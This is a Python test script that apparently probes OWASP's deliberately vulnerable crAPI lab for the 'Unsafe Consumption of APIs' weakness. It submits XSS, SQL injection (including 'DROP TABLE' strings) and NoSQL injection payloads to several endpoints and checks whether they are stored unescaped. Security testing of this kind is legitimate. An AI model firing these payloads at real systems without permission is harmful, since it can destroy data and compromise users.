#!/usr/bin/env python3
"""
OWASP API Security Top 10:2023 - API10: Unsafe Consumption of APIs
Target: crAPI running on Docker (default port 8888)

Tests for:
  - crAPI blindly consuming/reflecting data from third-party APIs (mechanic callback)
  - Injecting malicious data via the mechanic service callback to poison stored responses
  - XSS payload injection via upstream API data that crAPI stores without sanitization
  - SQL/NoSQL injection via upstream API response fields stored in crAPI's database
  - Server trusting user-supplied third-party data without validation
"""

import requests
import json
import sys
import time

from crapi_config import BASE_URL, USER1_EMAIL, USER1_PASSWORD, USER2_EMAIL, USER2_PASSWORD
USER_EMAIL = USER1_EMAIL
USER_PASSWORD = USER1_PASSWORD




def get_token():
    r = requests.post(f"{BASE_URL}/identity/api/auth/login",
                      json={"email": USER_EMAIL, "password": USER_PASSWORD})
    if r.status_code == 200:
        return r.json().get("token")
    return None


def get_vehicle_info(token):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{BASE_URL}/identity/api/v2/vehicle/vehicles", headers=headers)
    if r.status_code == 200 and r.json():
        v = r.json()[0]
        return v.get("vin"), v.get("uuid")
    return None, None


def test_mechanic_callback_payload_injection(token):
    """
    API10 Test: The contact_mechanic endpoint calls a user-supplied URL.
    If crAPI stores or reflects the response from that URL without sanitization,
    it's unsafe consumption of APIs.

    We inject an XSS payload as the 'problem_details' which may be stored and
    later rendered in the mechanic's report interface.
    """
    print(f"\n[API10:UnsafeConsumption] Mechanic Callback - Stored Payload Injection")
    headers = {"Authorization": f"Bearer {token}"}
    vin, uuid = get_vehicle_info(token)

    if not vin:
        print(f"  [SKIP] No vehicle found. Add a vehicle via the crAPI UI first.")
        return False

    # XSS payload in problem_details — if reflected/stored and rendered unsanitized
    xss_payload = "<script>alert('API10-XSS-crAPI')</script>"
    sqli_payload = "'; DROP TABLE mechanic_reports; --"
    nosql_payload = '{"$gt": ""}'

    test_cases = [
        ("XSS in problem_details",   xss_payload),
        ("SQLi in problem_details",  sqli_payload),
        ("NoSQLi in problem_details",nosql_payload),
    ]

    vulnerable = False
    for name, payload in test_cases:
        request_body = {
            "mechanic_api": f"{BASE_URL}/workshop/api/mechanic/",
            "problem_details": payload,
            "vin": vin,
            "mechanic_code": "TRAC_JHJ",
            "repeat_request_if_failed": False,
            "number_of_repeats": 1
        }

        r = requests.post(f"{BASE_URL}/workshop/api/mechanic/contact_mechanic",
                          headers=headers, json=request_body)
        print(f"\n  Test: {name}")
        print(f"  Payload: {payload}")
        print(f"  Submit Response: HTTP {r.status_code}")

        if r.status_code in (200, 201):
            resp_data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
            report_id = resp_data.get("id") or resp_data.get("report_id")
            print(f"  Report ID created: {report_id}")

            # Now retrieve the report to see if payload is stored unescaped
            if report_id:
                r2 = requests.get(
                    f"{BASE_URL}/workshop/api/mechanic/mechanic_report?report_id={report_id}",
                    headers=headers
                )
                report_body = r2.text
                print(f"  Retrieved Report (HTTP {r2.status_code}): {report_body[:200]}")

                if payload in report_body:
                    print(f"  [VULNERABLE] Payload stored and returned UNESCAPED in report!")
                    vulnerable = True
                elif any(p in report_body for p in ["<script>", "DROP TABLE", "$gt"]):
                    print(f"  [VULNERABLE] Partial payload found unescaped!")
                    vulnerable = True
                else:
                    print(f"  [PROTECTED or ENCODED] Payload not found verbatim in report")
        else:
            print(f"  Response: {r.text[:100]}")

    return vulnerable


def test_unsafe_third_party_data_in_community(token):
    """
    API10 Test: Inject malicious content via community posts that
    the API stores without sanitization (simulates upstream API feeding bad data).
    """
    print(f"\n[API10:UnsafeConsumption] Community Post - Stored XSS / Injection")
    headers = {"Authorization": f"Bearer {token}"}

    injection_payloads = [
        {"title": "<script>alert('xss')</script>", "body": "normal body"},
        {"title": "Normal Title", "body": "<img src=x onerror=alert('xss2')>"},
        {"title": "Normal Title", "body": '{"$where": "sleep(1000)"}'},
    ]

    vulnerable = False
    for payload in injection_payloads:
        r = requests.post(f"{BASE_URL}/community/api/v2/community/posts",
                          headers=headers, json=payload)
        print(f"\n  POST /community/posts")
        print(f"  Payload: {json.dumps(payload)[:100]}")
        print(f"  Response: HTTP {r.status_code}: {r.text[:120]}")

        if r.status_code in (200, 201):
            # Retrieve to check if stored raw
            r2 = requests.get(f"{BASE_URL}/community/api/v2/community/posts/recent",
                               headers=headers)
            if r2.status_code == 200:
                posts_text = r2.text
                for injected_value in [payload["title"], payload["body"]]:
                    if injected_value in posts_text and ("<script>" in injected_value
                                                          or "onerror" in injected_value
                                                          or "$where" in injected_value):
                        print(f"  [VULNERABLE] Injected payload '{injected_value[:50]}' stored unescaped!")
                        vulnerable = True

    if not vulnerable:
        print(f"\n  [PROTECTED] No unescaped payloads found in stored content")

    return vulnerable


def test_location_api_data_trust(token):
    """
    API10 Test: crAPI's vehicle location data comes from a backend service.
    Probe whether manipulated location inputs are stored and trusted without validation.
    """
    print(f"\n[API10:UnsafeConsumption] Vehicle Location Data Trust")
    headers = {"Authorization": f"Bearer {token}"}
    vin, uuid = get_vehicle_info(token)

    if not uuid:
        print(f"  [SKIP] No vehicle UUID found")
        return False

    # Attempt to POST/PUT crafted location data
    evil_location = {
        "latitude": "0; DROP TABLE vehicles; --",
        "longitude": "<script>alert(1)</script>",
        "vehicleId": uuid
    }

    # Try to update location with injected values
    r = requests.post(f"{BASE_URL}/identity/api/v2/vehicle/add_vehicle",
                      headers=headers, json=evil_location)
    print(f"  PUT /vehicle location with injected coords → HTTP {r.status_code}")
    print(f"  Response: {r.text[:150]}")

    # Retrieve location to check if stored
    r2 = requests.get(f"{BASE_URL}/identity/api/v2/vehicle/{uuid}/location",
                      headers=headers)
    print(f"  GET /vehicle/{uuid}/location → HTTP {r2.status_code}: {r2.text[:150]}")

    if r2.status_code == 200:
        loc_data = r2.text
        if "DROP TABLE" in loc_data or "<script>" in loc_data:
            print(f"  [VULNERABLE] Injected location data stored and returned unescaped!")
            return True
    print(f"  [PROTECTED] Injected location data not found in response")
    return False


def test_user_feedback_injection(token):
    """
    API10 Test: Can we inject malicious content via service feedback
    that gets stored and potentially rendered to mechanics or admins?
    """
    print(f"\n[API10:UnsafeConsumption] Service Feedback / Order Notes Injection")
    headers = {"Authorization": f"Bearer {token}"}

    # Get products for an order
    r = requests.get(f"{BASE_URL}/workshop/api/shop/products", headers=headers)
    if r.status_code != 200 or not r.json().get("products"):
        print(f"  [SKIP] No shop products available")
        return False

    product_id = r.json()["products"][0]["id"]

    # Place order with injected data in any free-text field
    order_payload = {
        "product_id": product_id,
        "quantity": 1
    }
    r2 = requests.post(f"{BASE_URL}/workshop/api/shop/orders",
                       headers=headers, json=order_payload)
    print(f"  POST /shop/orders → HTTP {r2.status_code}: {r2.text[:120]}")

    # Try to update/return with malicious content
    if r2.status_code in (200, 201):
        order_data = r2.json() if r2.headers.get("content-type","").startswith("application/json") else {}
        order_id = order_data.get("id") or order_data.get("order_id")
        if order_id:
            r3 = requests.put(
                f"{BASE_URL}/workshop/api/shop/orders/{order_id}/return_order",
                headers=headers
            )
            print(f"  Return order {order_id} → HTTP {r3.status_code}: {r3.text[:120]}")

    return False


def main():
    print("=" * 60)
    print("  crAPI - API10: Unsafe Consumption of APIs")
    print("=" * 60)
    print(f"\nTarget: {BASE_URL}")
    print(f"\nNOTE: This category focuses on how crAPI trusts and processes")
    print(f"data from third-party or upstream API calls without sanitization.\n")

    token = get_token()
    if not token:
        print("[ERROR] Authentication failed. Check USER_EMAIL/USER_PASSWORD.")
        sys.exit(1)
    print(f"[AUTH] Token acquired: {token[:40]}...")

    results = []
    results.append(("Mechanic Callback Payload Injection",   test_mechanic_callback_payload_injection(token)))
    results.append(("Community Post Stored XSS/Injection",   test_unsafe_third_party_data_in_community(token)))
    results.append(("Vehicle Location Data Trust",            test_location_api_data_trust(token)))
    results.append(("Order/Feedback Injection",               test_user_feedback_injection(token)))

    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    for name, vuln in results:
        status = "VULNERABLE ⚠️ " if vuln else "PROTECTED  ✅"
        print(f"  {status}  {name}")
    print()
    print("  CONTEXT: The mechanic contact_mechanic endpoint is inherently")
    print("  vulnerable to API10 — it performs a server-side fetch to a")
    print("  user-controlled URL, trusting whatever data is returned.")
    print()


if __name__ == "__main__":
    main()
